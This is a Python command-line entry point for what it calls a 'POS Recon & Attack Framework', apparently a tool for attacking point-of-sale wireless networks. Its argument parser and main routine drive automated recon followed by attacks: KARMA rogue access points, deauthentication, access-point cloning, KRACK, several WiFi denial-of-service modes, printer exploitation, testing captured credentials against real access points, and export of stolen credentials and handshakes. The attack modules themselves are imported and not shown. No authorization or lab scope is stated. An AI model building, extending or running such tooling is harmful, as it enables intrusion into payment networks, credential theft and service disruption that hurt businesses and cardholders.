"""
CLI Entry Point (Cross-Platform: Windows + Linux) - Stage 2 Enhanced
───────────────────────────────────────────────────────────────────
Usage:
  python -m posframework recon -i Wi-Fi              (Windows)
  sudo python3 -m posframework recon -i wlan0mon     (Linux)

Modes:
  recon   - Passive scan only (populates database)
  attack  - Auto-targeted attack using existing recon data
  full    - Recon then auto-attack (fully automated)

Stage 2 Features:
  - Signal strength targeting (RSSI filtering)
  - KARMA attack (respond to all probe requests)
  - WPA handshake capture to PCAP
  - Client isolation detection
  - Credential auto-testing against real AP
"""

import os
import sys
import signal
import time
import subprocess
import argparse
import ctypes

from .config import (
    DB_NAME, CHANNELS_24GHZ, CHANNELS_5GHZ, IS_WINDOWS, IS_LINUX,
    DEFAULT_MONITOR_IFACE, DEFAULT_AP_IFACE, log,
)
from .database import POSDatabase
from .recon import ReconEngine
from .orchestrator import AttackOrchestrator
from .monitor_mode import (
    check_npcap_monitor_support, get_available_interfaces,
    WindowsMonitorManager
)


def is_admin():
    """Check for elevated privileges (cross-platform)."""
    if IS_WINDOWS:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.getuid() == 0


def verify_privileges():
    """Warn if not running with admin/root (needed for raw sockets)."""
    if not is_admin():
        if IS_WINDOWS:
            log.warning("Not running as Administrator. Raw packet capture may fail.")
            log.warning("Right-click terminal -> 'Run as Administrator'")
        else:
            sys.exit("ERROR: Requires root. Run with sudo.")


def verify_interface(iface):
    """Verify the network interface exists (cross-platform)."""
    if IS_WINDOWS:
        npcap_path = r"C:\Windows\System32\Npcap"
        if not os.path.isdir(npcap_path):
            log.error("Npcap not found. Install from https://npcap.com/")
            sys.exit(1)
        log.info(f"Interface: {iface} (Npcap detected)")

        # Check for monitor mode support and enable if available
        if check_npcap_monitor_support():
            try:
                manager = WindowsMonitorManager(iface)
                if manager.enable_monitor_mode():
                    log.info(f"Monitor mode enabled on {iface}")
                else:
                    log.warning("Monitor mode could not be enabled, using native capture mode")
            except Exception as e:
                log.warning(f"Monitor mode setup failed: {e}")
                log.warning("Continuing with native capture mode")
        else:
            log.warning("Monitor mode may be limited on this interface")
    else:
        try:
            r = subprocess.run(["iw", "dev", iface, "info"],
                               capture_output=True, text=True, timeout=5)
            if r.returncode != 0:
                sys.exit(f"ERROR: Interface '{iface}' not found.")
        except FileNotFoundError:
            sys.exit("ERROR: 'iw' not found. Install: sudo apt install iw")
        except subprocess.TimeoutExpired:
            pass


def list_interfaces():
    """List available interfaces for the user."""
    try:
        from scapy.arch.windows import get_windows_if_list
        ifaces = get_windows_if_list()
        print("\nAvailable interfaces:")
        for i, iface in enumerate(ifaces):
            name = iface.get("name", "Unknown")
            desc = iface.get("description", "")
            # Check if this is a wireless interface
            is_wireless = "wifi" in desc.lower() or "wireless" in desc.lower()
            wireless_marker = "  [WIRELESS]" if is_wireless else ""
            print(f"  [{i}] {name}{wireless_marker}")
            print(f"       {desc}")
        print()
        
        # Also check for Npcap monitor support
        if IS_WINDOWS:
            print("Monitor Mode Status:")
            if check_npcap_monitor_support():
                print("  ✓ Npcap installed with monitor mode support")
            else:
                print("  ✗ Npcap not found or monitor mode unavailable")
                print("    Install from: https://npcap.com/")
    except ImportError:
        try:
            from scapy.all import get_if_list
            print("\nAvailable interfaces:")
            for iface in get_if_list():
                print(f"  {iface}")
            print()
        except Exception:
            pass


def build_parser():
    parser = argparse.ArgumentParser(
        description="POS Recon & Attack Framework v2 (Stage 2 Enhanced)",
        epilog="Scanned values auto-feed attack modules. No manual targeting required.")
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── Recon mode ────────────────────────────────────────────────────────────
    recon = sub.add_parser("recon", help="Passive recon only (scan and populate DB)")
    recon.add_argument("-i", "--interface", default=DEFAULT_MONITOR_IFACE,
                       help=f"Network interface (default: {DEFAULT_MONITOR_IFACE})")
    recon.add_argument("--5ghz", dest="use_5ghz", action="store_true")
    recon.add_argument("--timeout", type=int, default=None, help="Scan duration (seconds)")
    recon.add_argument("-v", "--verbose", action="store_true", help="Show all captured packets (not just POS)")
    recon.add_argument("--list-ifaces", action="store_true", help="List available interfaces")

    # ── Attack mode ───────────────────────────────────────────────────────────
    attack = sub.add_parser("attack",
        help="Auto-targeted attack (uses recon DB, runs quick scan if DB empty)")
    attack.add_argument("-i", "--interface", default=DEFAULT_MONITOR_IFACE)
    attack.add_argument("-a", "--ap-interface", default=DEFAULT_AP_IFACE)
    attack.add_argument("--5ghz", dest="use_5ghz", action="store_true")
    attack.add_argument("--recon-time", type=int, default=30)
    attack.add_argument("--no-beacons", action="store_true")
    attack.add_argument("--no-karma", action="store_true", help="Disable KARMA attack")
    attack.add_argument("--no-isolation-check", action="store_true", help="Skip isolation detection")
    attack.add_argument("--rssi-limit", type=int, default=-80, help="Min RSSI for deauth targets")
    attack.add_argument("--test-creds", action="store_true", help="Test captured credentials")
    attack.add_argument("-t", "--target", default=None, help="Target BSSID (auto if omitted)")
    attack.add_argument("--enable-ap-clone", action="store_true", help="Enable AP auto-clone after deauth")
    attack.add_argument("--enable-krack", action="store_true", help="Enable KRACK attack on captured handshakes")
    attack.add_argument("--enable-dos", action="store_true", help="Enable WiFi DoS attack")
    attack.add_argument("--dos-mode", choices=["cts_flood", "beacon_exhaust", "qos_null", "fragment"],
                        default="cts_flood", help="DoS attack mode")
    attack.add_argument("--enable-client-isolation", action="store_true", help="Enable subtle client isolation")
    attack.add_argument("--enable-printer-attacks", action="store_true", help="Enable printer exploitation modules")

    # ── Full mode ─────────────────────────────────────────────────────────────
    full = sub.add_parser("full", help="Full auto: recon -> attack")
    full.add_argument("-i", "--interface", default=DEFAULT_MONITOR_IFACE)
    full.add_argument("-a", "--ap-interface", default=DEFAULT_AP_IFACE)
    full.add_argument("--5ghz", dest="use_5ghz", action="store_true")
    full.add_argument("--recon-time", type=int, default=60)
    full.add_argument("--no-beacons", action="store_true")
    full.add_argument("--no-karma", action="store_true")
    full.add_argument("--rssi-limit", type=int, default=-80)
    full.add_argument("--test-creds", action="store_true")
    full.add_argument("--enable-ap-clone", action="store_true", help="Enable AP auto-clone after deauth")
    full.add_argument("--enable-krack", action="store_true", help="Enable KRACK attack on captured handshakes")
    full.add_argument("--enable-dos", action="store_true", help="Enable WiFi DoS attack")
    full.add_argument("--dos-mode", choices=["cts_flood", "beacon_exhaust", "qos_null", "fragment"],
                      default="cts_flood", help="DoS attack mode")
    full.add_argument("--enable-client-isolation", action="store_true", help="Enable subtle client isolation")
    full.add_argument("--enable-printer-attacks", action="store_true", help="Enable printer exploitation modules")

    # ── Analyze mode ──────────────────────────────────────────────────────────
    analyze = sub.add_parser("analyze",
        help="Post-attack analysis (analyze existing DB)")
    analyze.add_argument("-d", "--db", default=DB_NAME, help="Database file path")

    # ── Export mode ───────────────────────────────────────────────────────────
    export = sub.add_parser("export",
        help="Export data from existing DB")
    export.add_argument("-d", "--db", default=DB_NAME, help="Database file path")
    export.add_argument("-o", "--output", default="exports/credentials.json",
                       help="Output file for credentials")

    # ── Terminal mode ─────────────────────────────────────────────────────────
    terminal = sub.add_parser("terminal",
        help="Multi-terminal interface (real-time monitoring)")
    terminal.add_argument("-i", "--interface", default=DEFAULT_MONITOR_IFACE)
    terminal.add_argument("-a", "--ap-interface", default=DEFAULT_AP_IFACE)
    terminal.add_argument("-d", "--db", default=DB_NAME, help="Database file path")

    return parser


def main():
    verify_privileges()
    parser = build_parser()
    args = parser.parse_args()

    if getattr(args, 'list_ifaces', False):
        list_interfaces()
        return

    # Modes that don't need an interface
    if args.mode in ("analyze", "export"):
        pass
    else:
        channels = CHANNELS_24GHZ
        if getattr(args, 'use_5ghz', False):
            channels = CHANNELS_24GHZ + CHANNELS_5GHZ
        verify_interface(args.interface)

    orchestrator = None
    scanner = None

    def shutdown(signum, frame):
        log.info("Shutting down...")
        if orchestrator:
            orchestrator.stop()
        elif scanner:
            scanner.stop()
            scanner.db.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    if not IS_WINDOWS:
        signal.signal(signal.SIGTERM, shutdown)

    if args.mode == "recon":
        db = POSDatabase()
        scanner = ReconEngine(args.interface, db, channels=channels)
        if getattr(args, 'verbose', False):
            scanner.enable_verbose()
        log.info("Starting passive recon (Ctrl+C to stop)...")
        scanner.start(timeout=args.timeout)
        scanner.stop()
        stats = db.get_stats()
        log.info(f"Final: {stats['access_points']} APs ({stats['pos_access_points']} POS), "
                 f"{stats['clients']} clients ({stats['pos_clients']} POS)")
        db.close()

    elif args.mode == "attack":
        orchestrator = AttackOrchestrator(
            monitor_iface=args.interface,
            ap_iface=args.ap_interface,
            channels=channels,
            target_bssid=getattr(args, 'target', None),
            recon_duration=args.recon_time,
            enable_beacons=not getattr(args, 'no_beacons', False),
            enable_karma=not getattr(args, 'no_karma', False),
            enable_isolation_check=not getattr(args, 'no_isolation_check', False),
            signal_rssi_limit=args.rssi_limit,
            test_credentials=getattr(args, 'test_creds', False),
            enable_ap_clone=getattr(args, 'enable_ap_clone', False),
            enable_krack=getattr(args, 'enable_krack', False),
            enable_dos=getattr(args, 'enable_dos', False),
            dos_mode=getattr(args, 'dos_mode', None),
            enable_client_isolation=getattr(args, 'enable_client_isolation', False),
            enable_printer_attacks=getattr(args, 'enable_printer_attacks', False),
        )
        if orchestrator.start():
            while orchestrator.running:
                time.sleep(1)
        else:
            sys.exit(1)

    elif args.mode == "full":
        orchestrator = AttackOrchestrator(
            monitor_iface=args.interface,
            ap_iface=args.ap_interface,
            channels=channels,
            recon_duration=args.recon_time,
            enable_beacons=not getattr(args, 'no_beacons', False),
            enable_karma=not getattr(args, 'no_karma', False),
            enable_isolation_check=True,
            signal_rssi_limit=args.rssi_limit,
            test_credentials=getattr(args, 'test_creds', False),
            enable_ap_clone=getattr(args, 'enable_ap_clone', False),
            enable_krack=getattr(args, 'enable_krack', False),
            enable_dos=getattr(args, 'enable_dos', False),
            dos_mode=getattr(args, 'dos_mode', None),
            enable_client_isolation=getattr(args, 'enable_client_isolation', False),
            enable_printer_attacks=getattr(args, 'enable_printer_attacks', False),
        )
        if orchestrator.start():
            while orchestrator.running:
                time.sleep(1)
        else:
            sys.exit(1)

    elif args.mode == "analyze":
        # Post-attack analysis mode
        from .post_attack import PostAttackAnalyzer
        db = POSDatabase()
        analyzer = PostAttackAnalyzer(db)
        analyzer.print_summary()
        analyzer.export_credentials()
        analyzer.export_handshakes()
        analyzer.generate_report("exports/attack_report.json")
        db.close()
        log.info("Analysis complete. Check exports/ directory for detailed reports.")

    elif args.mode == "export":
        # Export data from existing database
        from .post_attack import PostAttackAnalyzer
        db = POSDatabase(args.db)
        analyzer = PostAttackAnalyzer(db)
        analyzer.export_credentials(args.output)
        analyzer.export_handshakes()
        db.close()
        log.info("Export complete. Check exports/ directory.")

    elif args.mode == "terminal":
        # Multi-terminal interface
        from .main import MultiTerminalInterface
        db = POSDatabase(args.db)
        ui = MultiTerminalInterface(args.interface, args.ap_interface, db)
        ui.run()


if __name__ == "__main__":
    main()
